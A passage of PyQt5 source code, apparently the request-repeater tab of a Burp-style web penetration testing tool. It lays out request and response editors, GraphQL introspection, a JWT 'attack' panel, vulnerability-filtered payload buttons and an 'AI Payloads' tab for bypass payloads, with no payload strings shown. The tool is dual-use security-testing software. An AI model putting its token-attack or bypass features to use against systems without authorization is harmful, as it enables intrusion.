        self._send_shortcut = QShortcut(QKeySequence("Ctrl+Return"), self)
        self._send_shortcut.setContext(Qt.WindowShortcut)
        self._send_shortcut.activated.connect(self._send_request)

        # History nav
        self.back_btn = QPushButton("◀")
        self.back_btn.setFixedWidth(32)
        self.back_btn.setToolTip("Previous request (history)")
        self.back_btn.setEnabled(False)
        self.back_btn.setStyleSheet(f"background:{COLOR_ELEVATED_BG};color:{COLOR_TEXT};border:1px solid {COLOR_BORDER};border-radius:4px;")
        self.back_btn.clicked.connect(self._history_back)

        self.fwd_btn = QPushButton("▶")
        self.fwd_btn.setFixedWidth(32)
        self.fwd_btn.setToolTip("Next request (history)")
        self.fwd_btn.setEnabled(False)
        self.fwd_btn.setStyleSheet(f"background:{COLOR_ELEVATED_BG};color:{COLOR_TEXT};border:1px solid {COLOR_BORDER};border-radius:4px;")
        self.fwd_btn.clicked.connect(self._history_fwd)

        self.history_label = QLabel("")
        self.history_label.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:11px;")

        toolbar.addWidget(QLabel("Host:"))
        toolbar.addWidget(self.host_input)
        toolbar.addWidget(QLabel("Port:"))
        toolbar.addWidget(self.port_input)
        toolbar.addWidget(self.ssl_check)
        toolbar.addWidget(QLabel("Timeout:"))
        toolbar.addWidget(self.timeout_spin)
        toolbar.addStretch()
        toolbar.addWidget(self.back_btn)
        toolbar.addWidget(self.history_label)
        toolbar.addWidget(self.fwd_btn)
        toolbar.addWidget(self.send_btn)

        # ── Payload bar (vuln filter + scrollable buttons) ─────────────────────
        payload_bar = QHBoxLayout()
        payload_bar.setContentsMargins(0, 0, 0, 0)
        payload_bar.setSpacing(4)

        # ── Vuln filter dropdown ──────────────────────────────────────────────
        self.vuln_combo = QComboBox()
        self.vuln_combo.addItem("All")
        self.vuln_combo.setFixedWidth(90)
        self.vuln_combo.setFixedHeight(26)
        self.vuln_combo.setToolTip("Filter payload buttons by vulnerability category")
        self.vuln_combo.setStyleSheet(
            f"QComboBox{{background:{COLOR_DARK_BG};color:{COLOR_TEXT};"
            f"border:1px solid {COLOR_BORDER};border-radius:4px;padding:1px 4px;}}"
            f"QComboBox::drop-down{{border:none;}}"
            f"QComboBox QAbstractItemView{{background:{COLOR_DARK_BG};color:{COLOR_TEXT};"
            f"border:1px solid {COLOR_BORDER};}}"
        )
        self.vuln_combo.currentTextChanged.connect(self._filter_payload_buttons)
        payload_bar.addWidget(self.vuln_combo)

        # ── Scrollable custom payload buttons ─────────────────────────────────
        self._payload_scroll = QScrollArea()
        self._payload_scroll.setHorizontalScrollBarPolicy(Qt.ScrollBarAsNeeded)
        self._payload_scroll.setVerticalScrollBarPolicy(Qt.ScrollBarAlwaysOff)
        self._payload_scroll.setWidgetResizable(True)
        self._payload_scroll.setFixedHeight(32)
        self._payload_scroll.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Fixed)
        self._payload_scroll.setStyleSheet(
            f"QScrollArea{{background:transparent;border:none;}}"
            f"QScrollBar:horizontal{{height:4px;background:{COLOR_DARK_BG};}}"
            f"QScrollBar::handle:horizontal{{background:{COLOR_BORDER};border-radius:2px;}}"
            f"QScrollBar::add-line:horizontal,QScrollBar::sub-line:horizontal{{width:0px;}}"
        )
        self._payload_btn_widget = QWidget()
        self._payload_btn_widget.setStyleSheet("background:transparent;")
        self._payload_btn_layout = QHBoxLayout(self._payload_btn_widget)
        self._payload_btn_layout.setContentsMargins(2, 0, 2, 0)
        self._payload_btn_layout.setSpacing(3)
        self._payload_btn_layout.addStretch()
        self._payload_scroll.setWidget(self._payload_btn_widget)
        payload_bar.addWidget(self._payload_scroll)

        root.addLayout(payload_bar)
        root.addLayout(toolbar)

        # ── Main splitter ─────────────────────────────────────────────────────
        splitter = QSplitter(Qt.Horizontal)

        # Left: request editor
        req_frame = QFrame()
        req_frame.setStyleSheet(f"border:1px solid {COLOR_BORDER};border-radius:6px;")
        req_layout = QVBoxLayout(req_frame)
        req_layout.setContentsMargins(0, 0, 0, 0)
        req_layout.setSpacing(0)

        req_header = QFrame()
        req_header.setFixedHeight(30)
        req_header.setStyleSheet(f"background:{COLOR_ELEVATED_BG};border-bottom:1px solid {COLOR_BORDER};")
        _req_hdr_hl = QHBoxLayout(req_header)
        _req_hdr_hl.setContentsMargins(8, 0, 8, 0)
        _req_hdr_hl.setSpacing(6)
        _req_hdr_lbl = QLabel("  REQUEST")
        _req_hdr_lbl.setStyleSheet(f"color:{COLOR_ACCENT};font-weight:700;font-size:12px;")
        _req_hdr_hl.addWidget(_req_hdr_lbl)
        _gql_btn_style = (
            f"QPushButton {{ background-color: transparent; color: {COLOR_ACCENT};"
            f" border: 1px solid {COLOR_ACCENT}; border-radius: 3px;"
            f" padding: 1px 7px; font-size: 10px; font-weight: 600; }}"
            f" QPushButton:hover {{ background-color: {COLOR_ACCENT}; color: {COLOR_DARK_BG}; }}"
            f" QPushButton:checked {{ background-color: {COLOR_ACCENT}; color: {COLOR_DARK_BG}; }}"
        )
        self.req_graphql_btn = QPushButton("⬡ GraphQL")
        self.req_graphql_btn.setCheckable(True)
        self.req_graphql_btn.setStyleSheet(_gql_btn_style)
        self.req_graphql_btn.setToolTip("Switch to GraphQL pretty-print view")
        self.req_graphql_btn.setVisible(False)
        self.req_graphql_btn.clicked.connect(self._toggle_gql_req)
        _req_hdr_hl.addWidget(self.req_graphql_btn)
        self.req_introspect_btn = QPushButton("⬡ Full Introspection")
        self.req_introspect_btn.setStyleSheet(_gql_btn_style)
        self.req_introspect_btn.setToolTip("Send a full GraphQL introspection query")
        self.req_introspect_btn.setVisible(False)
        self.req_introspect_btn.clicked.connect(self._run_introspection)
        _req_hdr_hl.addWidget(self.req_introspect_btn)
        _jwt_btn_style = (
            "QPushButton { background-color: transparent; color: #e5a550;"
            " border: 1px solid #e5a550; border-radius: 3px;"
            " padding: 1px 7px; font-size: 10px; font-weight: 600; }"
            " QPushButton:hover { background-color: #e5a550; color: #1a1a2e; }"
            " QPushButton:checked { background-color: #e5a550; color: #1a1a2e; }"
        )
        self.req_jwt_btn = QPushButton(" JWT")
        self.req_jwt_btn.setCheckable(True)
        self.req_jwt_btn.setStyleSheet(_jwt_btn_style)
        self.req_jwt_btn.setToolTip("JWT detected — click to view/edit/attack the token")
        self.req_jwt_btn.setVisible(False)
        self.req_jwt_btn.clicked.connect(self._toggle_jwt_req)
        _req_hdr_hl.addWidget(self.req_jwt_btn)
        _req_hdr_hl.addStretch()

        self.request_editor = QPlainTextEdit()
        self.request_editor.setStyleSheet(f"""
            QPlainTextEdit {{
                background:{COLOR_DARK_BG};color:{COLOR_TEXT};
                font-family:{FONT_FAMILY_MONO};
                font-size:12px;border:none;
            }}
        """)
        self.request_editor.setLineWrapMode(QPlainTextEdit.WidgetWidth)
        self._req_hl = HttpSyntaxHighlighter(self.request_editor.document())

        # Enable context menu and shortcuts
        self.request_editor.setContextMenuPolicy(Qt.CustomContextMenu)
        self.request_editor.customContextMenuRequested.connect(self._show_request_context_menu)

        self.shortcut_url_enc = QShortcut(QKeySequence("Ctrl+U"), self.request_editor)
        self.shortcut_url_enc.activated.connect(self._url_encode_selection)

        self.shortcut_url_dec = QShortcut(QKeySequence("Ctrl+Shift+U"), self.request_editor)
        self.shortcut_url_dec.activated.connect(self._url_decode_selection)

        self.shortcut_b64_enc = QShortcut(QKeySequence("Ctrl+B"), self.request_editor)
        self.shortcut_b64_enc.activated.connect(self._base64_encode_selection)

        self.shortcut_b64_dec = QShortcut(QKeySequence("Ctrl+Shift+B"), self.request_editor)
        self.shortcut_b64_dec.activated.connect(self._base64_decode_selection)

        # ── AI Chat toggle (Ctrl+Shift+C) ─────────────────────────────────
        self.shortcut_ai_toggle = QShortcut(QKeySequence("Ctrl+Shift+C"), self)
        self.shortcut_ai_toggle.activated.connect(self._ai_toggle_panel)

        # request toolbar
        req_tools = QHBoxLayout()
        req_tools.setContentsMargins(4, 2, 4, 2)

        clear_req_btn = QPushButton("Clear")
        clear_req_btn.setFixedHeight(22)
        clear_req_btn.setStyleSheet(f"background:{COLOR_ELEVATED_BG};color:{COLOR_TEXT};border:1px solid {COLOR_BORDER};border-radius:3px;font-size:11px;padding:0 8px;")
        clear_req_btn.clicked.connect(self.request_editor.clear)

        copy_req_btn = QPushButton("Copy")
        copy_req_btn.setFixedHeight(22)
        copy_req_btn.setStyleSheet(f"background:{COLOR_ELEVATED_BG};color:{COLOR_TEXT};border:1px solid {COLOR_BORDER};border-radius:3px;font-size:11px;padding:0 8px;")
        copy_req_btn.clicked.connect(lambda: self._copy_text(self.request_editor.toPlainText()))

        prettify_btn = QPushButton("Prettify")
        prettify_btn.setFixedHeight(22)
        prettify_btn.setStyleSheet(f"background:{COLOR_ELEVATED_BG};color:{COLOR_ACCENT};border:1px solid {COLOR_BORDER};border-radius:3px;font-size:11px;padding:0 8px;")
        prettify_btn.clicked.connect(self._prettify_request_body)

        req_tools.addWidget(clear_req_btn)
        req_tools.addWidget(copy_req_btn)
        req_tools.addWidget(prettify_btn)

        _sep = QFrame()
        _sep.setFrameShape(QFrame.VLine)
        _sep.setStyleSheet(f"color:{COLOR_BORDER};")
        req_tools.addWidget(_sep)

        ai_payloads_btn = QPushButton(" AI Payloads")
        ai_payloads_btn.setFixedHeight(22)
        ai_payloads_btn.setToolTip("Generate AI-targeted bypass payloads for the selected injection point")
        ai_payloads_btn.setStyleSheet(
            f"QPushButton{{background:{COLOR_ELEVATED_BG};color:#b48eff;"
            f"border:1px solid #7c5cbf;border-radius:3px;font-size:11px;padding:0 8px;}}"
            f"QPushButton:hover{{background:#2a1f3a;}}"
        )
        ai_payloads_btn.clicked.connect(self._open_ai_payloads_tab)
        req_tools.addWidget(ai_payloads_btn)

        req_tools.addStretch()

        req_tools_frame = QFrame()
        req_tools_frame.setStyleSheet(f"background:{COLOR_ELEVATED_BG};border-top:1px solid {COLOR_BORDER};")
        req_tools_frame.setLayout(req_tools)
        req_tools_frame.setFixedHeight(30)

        req_layout.addWidget(req_header)
        self._resp_sel_panel = self._build_resp_sel_inspector_panel()

        _gql_spl_style = (
            f"QSplitter::handle:vertical {{ background-color: {COLOR_BORDER}; min-height: 4px; }}"
            f" QSplitter::handle:vertical:hover {{ background-color: {COLOR_ACCENT}; }}"
        )
        self.req_gql_splitter = QSplitter(Qt.Vertical)
        self.req_gql_splitter.setHandleWidth(5)
        self.req_gql_splitter.setChildrenCollapsible(False)
        self.req_gql_splitter.setStyleSheet(_gql_spl_style)
        (self.req_gql_query_panel,
         self.req_gql_query_text)  = self._make_gql_panel("⬡  QUERY",          COLOR_TEXT_BRIGHT, read_only=False, highlight="gql")
        (self.req_gql_vars_panel,
         self.req_gql_vars_text)   = self._make_gql_panel("⬡  VARIABLES",      COLOR_ACCENT,      read_only=False, highlight="json")
        (self.req_gql_opname_panel,
         self.req_gql_opname_text) = self._make_gql_panel("⬡  OPERATION NAME", COLOR_TEXT_MUTED,  read_only=False)
        self.req_gql_splitter.addWidget(self.req_gql_query_panel)
        self.req_gql_splitter.addWidget(self.req_gql_vars_panel)
        self.req_gql_splitter.addWidget(self.req_gql_opname_panel)

        self.req_stack = QStackedWidget()
        self.req_stack.addWidget(self.request_editor)    # page 0: raw
        self.req_stack.addWidget(self.req_gql_splitter)  # page 1: GraphQL panels
        self.req_jwt_widget = self._build_jwt_req_panel()
        self.req_stack.addWidget(self.req_jwt_widget)    # page 2: JWT panel
        req_layout.addWidget(self.req_stack)
        req_layout.addWidget(req_tools_frame)

        # Right: response viewer (tabbed: Pretty / Raw / Headers)
        resp_frame = QFrame()
        resp_frame.setStyleSheet(f"border:1px solid {COLOR_BORDER};border-radius:6px;")
        resp_layout = QVBoxLayout(resp_frame)
        resp_layout.setContentsMargins(0, 0, 0, 0)
        resp_layout.setSpacing(0)

        resp_header_bar = QHBoxLayout()
        resp_header_bar.setContentsMargins(8, 0, 8, 0)
        resp_label = QLabel("RESPONSE")
        resp_label.setStyleSheet(f"color:{COLOR_SUCCESS};font-weight:700;font-size:12px;")

        self.status_badge = QLabel("")
        self.status_badge.setStyleSheet(f"color:{COLOR_TEXT};font-size:11px;padding-left:8px;")
        self.length_badge = QLabel("")
        self.length_badge.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:11px;padding-left:8px;")
        self.time_badge   = QLabel("")
        self.time_badge.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:11px;padding-left:8px;")

        # Search widgets
        self.resp_search_input = QLineEdit()
        self.resp_search_input.setPlaceholderText("Search...")
        self.resp_search_input.setFixedWidth(140)
        self.resp_search_input.setStyleSheet(f"background:{COLOR_DARK_BG};color:{COLOR_TEXT};border:1px solid {COLOR_BORDER};border-radius:4px;padding:2px 6px;font-size:11px;")
        self.resp_search_input.returnPressed.connect(self._search_next_response)

        self.resp_search_prev = QPushButton("◀")
        self.resp_search_prev.setFixedSize(24, 22)
        self.resp_search_prev.setCursor(Qt.PointingHandCursor)
        self.resp_search_prev.setToolTip("Previous match")
        self.resp_search_prev.setStyleSheet(f"background:{COLOR_ELEVATED_BG};color:{COLOR_TEXT};border:1px solid {COLOR_BORDER};border-radius:3px;")
        self.resp_search_prev.clicked.connect(self._search_prev_response)

        self.resp_search_next = QPushButton("▶")
        self.resp_search_next.setFixedSize(24, 22)
        self.resp_search_next.setCursor(Qt.PointingHandCursor)
        self.resp_search_next.setToolTip("Next match")
        self.resp_search_next.setStyleSheet(f"background:{COLOR_ELEVATED_BG};color:{COLOR_TEXT};border:1px solid {COLOR_BORDER};border-radius:3px;")
        self.resp_search_next.clicked.connect(self._search_next_response)

        resp_header_widget = QFrame()
        resp_header_widget.setStyleSheet(f"background:{COLOR_ELEVATED_BG};border-bottom:1px solid {COLOR_BORDER};")
        resp_header_widget.setFixedHeight(30)
        resp_header_widget.setLayout(resp_header_bar)
        resp_header_bar.addWidget(resp_label)
        resp_header_bar.addWidget(self.status_badge)
        resp_header_bar.addWidget(self.length_badge)
        resp_header_bar.addWidget(self.time_badge)
        resp_header_bar.addStretch()

        # ── Check Reflection checkbox ─────────────────────────────────────
        self.reflect_check = QCheckBox("🔍 Check Reflection")
        self.reflect_check.setChecked(False)
        self.reflect_check.setToolTip(
            "When enabled, request values that appear in the response are highlighted"
        )
        self.reflect_check.setStyleSheet(f"""
            QCheckBox {{ color:{COLOR_TEXT_MUTED}; font-size:11px; }}
            QCheckBox:checked {{ color:#f0c040; font-weight:bold; }}
            QCheckBox::indicator {{
                width:13px; height:13px;
                border:1px solid {COLOR_BORDER};
                border-radius:2px;
                background:{COLOR_DARK_BG};
            }}
            QCheckBox::indicator:checked {{
                background:#7d6608;
                border-color:#f0c040;
            }}
        """)
        self.reflect_check.stateChanged.connect(self._on_reflect_toggled)
        resp_header_bar.addWidget(self.reflect_check)

        self.resp_graphql_btn = QPushButton("⬡ GraphQL")
        self.resp_graphql_btn.setCheckable(True)
        self.resp_graphql_btn.setStyleSheet(_gql_btn_style)
        self.resp_graphql_btn.setToolTip("Switch to GraphQL pretty-print view")
        self.resp_graphql_btn.setVisible(False)
        self.resp_graphql_btn.clicked.connect(self._toggle_gql_resp)
        resp_header_bar.addWidget(self.resp_graphql_btn)
        self.resp_visualizer_btn = QPushButton("⬡ Visualize Schema")
        self.resp_visualizer_btn.setStyleSheet(_gql_btn_style)
        self.resp_visualizer_btn.setToolTip("Open introspection response as an interactive schema graph")
        self.resp_visualizer_btn.setVisible(False)
        self.resp_visualizer_btn.clicked.connect(self._show_gql_visualizer)
        resp_header_bar.addWidget(self.resp_visualizer_btn)
        _jwt_btn_style_resp = (
            "QPushButton { background-color: transparent; color: #e5a550;"
            " border: 1px solid #e5a550; border-radius: 3px;"
            " padding: 1px 7px; font-size: 10px; font-weight: 600; }"
            " QPushButton:hover { background-color: #e5a550; color: #1a1a2e; }"
            " QPushButton:checked { background-color: #e5a550; color: #1a1a2e; }"
        )
        self.resp_jwt_btn = QPushButton(" JWT")
        self.resp_jwt_btn.setCheckable(True)
        self.resp_jwt_btn.setStyleSheet(_jwt_btn_style_resp)
        self.resp_jwt_btn.setToolTip("JWT detected in response — click to analyse")
        self.resp_jwt_btn.setVisible(False)
        self.resp_jwt_btn.clicked.connect(self._toggle_jwt_resp)
        resp_header_bar.addWidget(self.resp_jwt_btn)

        resp_header_bar.addWidget(self.resp_search_input)
        resp_header_bar.addWidget(self.resp_search_prev)
        resp_header_bar.addWidget(self.resp_search_next)

        # Response tabs: Pretty | Raw | Headers
        self.resp_tabs = QTabWidget()
        self.resp_tabs.setStyleSheet(f"""
            QTabWidget::pane {{ border: none; }}
            QTabBar::tab {{ background:{COLOR_ELEVATED_BG};color:{COLOR_TEXT_MUTED};padding:4px 12px;border:none; font-size:12px;}}
            QTabBar::tab:selected {{ color:{COLOR_TEXT_BRIGHT};border-bottom:2px solid {COLOR_ACCENT}; }}
            QTabBar::tab:hover {{ color:{COLOR_TEXT}; }}
        """)

        self.resp_pretty = QPlainTextEdit()
        self.resp_pretty.setReadOnly(True)
        self.resp_pretty.setStyleSheet(f"background:{COLOR_DARK_BG};color:{COLOR_TEXT};font-family:{FONT_FAMILY_MONO};font-size:12px;border:none;")
        self.resp_pretty.setLineWrapMode(QPlainTextEdit.WidgetWidth)
        self._resp_hl = HttpSyntaxHighlighter(self.resp_pretty.document())

        self.resp_raw = QPlainTextEdit()
        self.resp_raw.setReadOnly(True)
        self.resp_raw.setStyleSheet(f"background:{COLOR_DARK_BG};color:{COLOR_TEXT};font-family:{FONT_FAMILY_MONO};font-size:12px;border:none;")
        self.resp_raw.setLineWrapMode(QPlainTextEdit.WidgetWidth)

        self.resp_headers = QPlainTextEdit()
        self.resp_headers.setReadOnly(True)
        self.resp_headers.setStyleSheet(f"background:{COLOR_DARK_BG};color:{COLOR_TEXT};font-family:{FONT_FAMILY_MONO};font-size:12px;border:none;")

        self.resp_tabs.addTab(self.resp_pretty, "Pretty")
        self.resp_tabs.addTab(self.resp_raw,    "Raw")
        self.resp_tabs.addTab(self.resp_headers,"Headers")
        self._ai_payloads_tab_widget = self._build_ai_payloads_tab()
        self.resp_tabs.addTab(self._ai_payloads_tab_widget, " AI Payloads")

        # Response toolbar
        resp_tools = QHBoxLayout()
        resp_tools.setContentsMargins(4, 2, 4, 2)
        
        self.follow_redirect_btn = QPushButton("↪ Follow Redirect")
        self.follow_redirect_btn.setFixedHeight(22)
        self.follow_redirect_btn.setStyleSheet(f"background:{COLOR_ELEVATED_BG};color:{COLOR_ACCENT};border:1px solid {COLOR_BORDER};border-radius:3px;font-size:11px;padding:0 8px;")
        self.follow_redirect_btn.clicked.connect(self._follow_redirect_action)
        self.follow_redirect_btn.setVisible(False)

        copy_resp_btn = QPushButton("Copy Response")
        copy_resp_btn.setFixedHeight(22)
        copy_resp_btn.setStyleSheet(f"background:{COLOR_ELEVATED_BG};color:{COLOR_TEXT};border:1px solid {COLOR_BORDER};border-radius:3px;font-size:11px;padding:0 8px;")
        copy_resp_btn.clicked.connect(lambda: self._copy_text(self.resp_raw.toPlainText()))

        send_to_comparer_btn = QPushButton("→ Comparer")
        send_to_comparer_btn.setFixedHeight(22)
        send_to_comparer_btn.setStyleSheet(f"background:{COLOR_ELEVATED_BG};color:{COLOR_ACCENT};border:1px solid {COLOR_BORDER};border-radius:3px;font-size:11px;padding:0 8px;")
        send_to_comparer_btn.clicked.connect(self._send_to_comparer)

        send_to_intruder_btn = QPushButton("→ Intruder")
        send_to_intruder_btn.setFixedHeight(22)
        send_to_intruder_btn.setStyleSheet(f"background:{COLOR_ELEVATED_BG};color:{COLOR_ACCENT};border:1px solid {COLOR_BORDER};border-radius:3px;font-size:11px;padding:0 8px;")
        send_to_intruder_btn.clicked.connect(self._send_to_intruder)

        send_to_scanner_btn = QPushButton("→ Scanner")
        send_to_scanner_btn.setFixedHeight(22)
        send_to_scanner_btn.setStyleSheet(f"background:{COLOR_ELEVATED_BG};color:{COLOR_ACCENT};border:1px solid {COLOR_BORDER};border-radius:3px;font-size:11px;padding:0 8px;")
        send_to_scanner_btn.clicked.connect(self._send_to_scanner)

        resp_tools.addWidget(self.follow_redirect_btn)
        resp_tools.addWidget(copy_resp_btn)
        resp_tools.addWidget(send_to_comparer_btn)
        resp_tools.addWidget(send_to_intruder_btn)
        resp_tools.addWidget(send_to_scanner_btn)
        resp_tools.addStretch()

        resp_tools_frame = QFrame()
        resp_tools_frame.setStyleSheet(f"background:{COLOR_ELEVATED_BG};border-top:1px solid {COLOR_BORDER};")
        resp_tools_frame.setLayout(resp_tools)
        resp_tools_frame.setFixedHeight(30)

        resp_layout.addWidget(resp_header_widget)
        self._req_sel_panel = self._build_req_sel_inspector_panel()

        self.resp_gql_splitter = QSplitter(Qt.Vertical)
        self.resp_gql_splitter.setHandleWidth(5)
        self.resp_gql_splitter.setChildrenCollapsible(False)
        self.resp_gql_splitter.setStyleSheet(_gql_spl_style)
        (self.resp_gql_errors_panel,
         self.resp_gql_errors_text) = self._make_gql_panel("⬡  ERRORS",     "#e05c5c")
        (self.resp_gql_data_panel,
         self.resp_gql_data_text)   = self._make_gql_panel("⬡  DATA",       COLOR_SUCCESS,   highlight="json")
        (self.resp_gql_exts_panel,
         self.resp_gql_exts_text)   = self._make_gql_panel("⬡  EXTENSIONS", COLOR_TEXT_MUTED, highlight="json")
        self.resp_gql_splitter.addWidget(self.resp_gql_errors_panel)
        self.resp_gql_splitter.addWidget(self.resp_gql_data_panel)
        self.resp_gql_splitter.addWidget(self.resp_gql_exts_panel)

        self.resp_stack = QStackedWidget()
        self.resp_stack.addWidget(self.resp_tabs)           # page 0: raw tabs
        self.resp_stack.addWidget(self.resp_gql_splitter)  # page 1: GraphQL panels
        self.resp_jwt_widget = self._build_jwt_resp_panel()
        self.resp_stack.addWidget(self.resp_jwt_widget)    # page 2: JWT panel
        resp_layout.addWidget(self.resp_stack)
        resp_layout.addWidget(resp_tools_frame)

        splitter.addWidget(req_frame)
        splitter.addWidget(resp_frame)
        splitter.setStretchFactor(0, 1)
        splitter.setStretchFactor(1, 1)

        # ── Inspector side panel (3rd column) ─────────────────────────────────
        self._inspector_side_frame = QFrame()
        self._inspector_side_frame.setStyleSheet(
            f"QFrame{{background:{COLOR_DARK_BG}; border-left:1px solid {COLOR_BORDER};}}"
        )
        _insp_hl = QHBoxLayout(self._inspector_side_frame)
        _insp_hl.setContentsMargins(0, 0, 0, 0)
        _insp_hl.setSpacing(0)

        # Always-visible toggle strip (26 px wide, full height)
        _insp_strip = QFrame()
        _insp_strip.setFixedWidth(34)
        _insp_strip.setSizePolicy(QSizePolicy.Fixed, QSizePolicy.Expanding)
        _insp_strip.setStyleSheet(
            f"QFrame{{background:{COLOR_ELEVATED_BG}; border:none;"
            f"border-right:1px solid {COLOR_BORDER};}}"
        )
        _insp_strip_vl = QVBoxLayout(_insp_strip)
        _insp_strip_vl.setContentsMargins(0, 0, 0, 0)
        _insp_strip_vl.setSpacing(0)

        # Full-height vertical label acts as the toggle button
        self._insp_vert_lbl = _VerticalLabel("SELECTION INSPECTOR")
        self._insp_vert_lbl.setStyleSheet(
            f"color:{COLOR_TEXT_MUTED};font-size:11px;font-weight:700;"
            f"background:transparent;letter-spacing:2px;"
        )
        self._insp_vert_lbl.set_click_handler(self._toggle_inspector_panel)
        _insp_strip_vl.addWidget(self._insp_vert_lbl)

        _insp_hl.addWidget(_insp_strip)

        # Content frame (hidden when collapsed)
        self._insp_content = QFrame()
        self._insp_content.setStyleSheet("QFrame{background:transparent;border:none;}")
        self._insp_content.setVisible(False)
        self._insp_content.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Expanding)
        _insp_content_vl = QVBoxLayout(self._insp_content)
        _insp_content_vl.setContentsMargins(0, 0, 0, 0)
        _insp_content_vl.setSpacing(0)
        # Single visible inspector section: shows the last selected source
        # (request or response) instead of two separate stacked sections.
        self._insp_sel_stack = QStackedWidget()
        self._insp_sel_stack.addWidget(self._req_sel_panel)
        self._insp_sel_stack.addWidget(self._resp_sel_panel)
        self._insp_sel_stack.setCurrentWidget(self._req_sel_panel)
        _insp_content_vl.addWidget(self._insp_sel_stack)
        _insp_hl.addWidget(self._insp_content)

        splitter.addWidget(self._inspector_side_frame)
        splitter.setStretchFactor(2, 0)
        self._inspector_is_open = False
        self._inspector_side_frame.setFixedWidth(34)
        splitter.setSizes([500, 500, 34])
        self._main_splitter = splitter

        # ── AI chat outer splitter (panel is reparented here on demand) ─────────────
        self._ai_outer_splitter = QSplitter(Qt.Horizontal)
        self._ai_outer_splitter.setHandleWidth(1)
        self._ai_outer_splitter.setChildrenCollapsible(True)
        self._ai_outer_splitter.addWidget(splitter)
        root.addWidget(self._ai_outer_splitter)

        # ── Selection Inspector — wire up signals ─────────────────────────────
        self.request_editor.selectionChanged.connect(self._on_repeater_req_selection_changed)
        self.resp_pretty.selectionChanged.connect(self._on_repeater_resp_selection_changed)
        self.resp_raw.selectionChanged.connect(self._on_repeater_resp_selection_changed)

        # Debounce heavy selection analysis so selection drag stays smooth.
        self._sel_req_timer = QTimer(self)
        self._sel_req_timer.setSingleShot(True)
        self._sel_req_timer.setInterval(110)
        self._sel_req_timer.timeout.connect(self._process_repeater_req_selection)
        self._sel_resp_timer = QTimer(self)
        self._sel_resp_timer.setSingleShot(True)
        self._sel_resp_timer.setInterval(110)
        self._sel_resp_timer.timeout.connect(self._process_repeater_resp_selection)
        self._rsel_pending_text = ""
        self._respsel_pending_text = ""
        self._rsel_last_analysis = None  # (text, cards, enc, dec)
        self._respsel_last_analysis = None

        # GraphQL view state
        self._gql_state     = {}
        self._gql_req_mode  = False
        self._gql_resp_mode = False
        # Debounce timer: detect GraphQL when raw request text changes (paste / type)
        self._gql_detect_timer = QTimer(self)
        self._gql_detect_timer.setSingleShot(True)
        self._gql_detect_timer.setInterval(600)
        self._gql_detect_timer.timeout.connect(self._on_req_text_changed_detect)
        self.request_editor.textChanged.connect(self._gql_detect_timer.start)

        # JWT view state
        self._jwt_state     = {}   # {token, location, header, payload, sig, alg, exp_ts}
        self._jwt_req_mode  = False
        self._jwt_resp_mode = False

        # ── Status bar ────────────────────────────────────────────────────────
        self.status_bar = QLabel("Ready  •  Ctrl+Enter to send")
        self.status_bar.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:11px;padding:3px 8px;background:{COLOR_ELEVATED_BG};border-top:1px solid {COLOR_BORDER};")
        self.status_bar.setFixedHeight(22)
        root.addWidget(self.status_bar)

    # ── Helpers ───────────────────────────────────────────────────────────────

    def _toggle_port_default(self):
        if self.ssl_check.isChecked():
            if self.port_input.text() in ("80", ""):
                self.port_input.setText("443")
        else:
            if self.port_input.text() in ("443", ""):
                self.port_input.setText("80")

    def _copy_text(self, text: str):
        from PyQt5.QtWidgets import QApplication
        QApplication.clipboard().setText(text)
        self.status_bar.setText("📋 Copied to clipboard")
        QTimer.singleShot(2000, lambda: self.status_bar.setText("Ready"))

    def _prettify_request_body(self):
        """Try to pretty-print JSON body in request."""
        raw = self.request_editor.toPlainText()
        if "\r\n\r\n" in raw:
            head, body = raw.split("\r\n\r\n", 1)
        elif "\n\n" in raw:
            head, body = raw.split("\n\n", 1)
        else:
            return
        try:
            parsed = json.loads(body.strip())
            pretty = json.dumps(parsed, indent=2)
            self.request_editor.setPlainText(head + "\n\n" + pretty)
        except Exception:
            pass

    def _parse_host_from_request(self) -> str:
        """Extract Host header from raw request text."""
        raw = self.request_editor.toPlainText()
        m = re.search(r'^[Hh]ost:\s*(.+)$', raw, re.MULTILINE)
        if m:
            return m.group(1).strip().split(":")[0]
        return self.host_input.text().strip()

    def _send_request(self):
        # If the request GQL view is active, flush panel edits back to the raw editor first
        if self._gql_req_mode:
            self._sync_gql_to_raw()
        # JWT view: do NOT auto-flush — the user must explicitly click "Apply to Request"
        # or "Sign & Apply" to write their edits into the raw request.  Silently flushing
        # an unsigned token here would strip the original signature on every Send.
        raw = self.request_editor.toPlainText().strip()
        if not raw:
            QMessageBox.warning(self, "No Request", "Please enter an HTTP request.")
            return

        host = self.host_input.text().strip() or self._parse_host_from_request()
        if not host:
            QMessageBox.warning(self, "No Host", "Please specify a host.")
            return

        try:
            port = int(self.port_input.text()) if self.port_input.text() else (443 if self.ssl_check.isChecked() else 80)
        except ValueError:
            port = 443 if self.ssl_check.isChecked() else 80

        self.send_btn.setEnabled(False)
        self.send_btn.setText("⏳ Sending…")
        self.status_bar.setText(f"Sending to {host}:{port}…")
        self.resp_pretty.setPlainText("")
        self.resp_raw.setPlainText("")
        self.resp_headers.setPlainText("")
        self.status_badge.setText("")
        self.length_badge.setText("")
        self.time_badge.setText("")

        timeout = self.timeout_spin.value()
        self._send_thread = HttpSendThread(host, port, self.ssl_check.isChecked(), raw, timeout, False)
        self._send_thread.response_received.connect(self._on_response)
        self._send_thread.send_error.connect(self._on_send_error)
        self._send_thread.start()

    def _on_response(self, resp_text: str, elapsed_ms: float, size_bytes: int):
        self.send_btn.setEnabled(True)
        self.send_btn.setText("▶  Send")

        # Status code
        status_code = ""
        m = re.match(r'HTTP/\S+\s+(\d+)', resp_text)
        if m:
            status_code = m.group(1)
            code = int(status_code)
            if code < 300:
                color = "#98c379"
            elif code < 400:
                color = "#e5c07b"
            elif code < 500:
                color = "#e06c75"
            else:
                color = "#c678dd"
            self.status_badge.setText(f"<b style='color:{color};'>{status_code}</b>")
            
            # Check for redirect
            self.follow_redirect_btn.setVisible(False)
            if int(status_code) in (301, 302, 303, 307, 308):
                if re.search(r'^[Ll]ocation:\s*(.+)$', resp_text, re.MULTILINE):
                    self.follow_redirect_btn.setVisible(True)

        # Badges
        self.length_badge.setText(f"  {self._format_size(size_bytes)}")
        self.time_badge.setText(f"  {elapsed_ms:.0f} ms")

        # Split headers / body
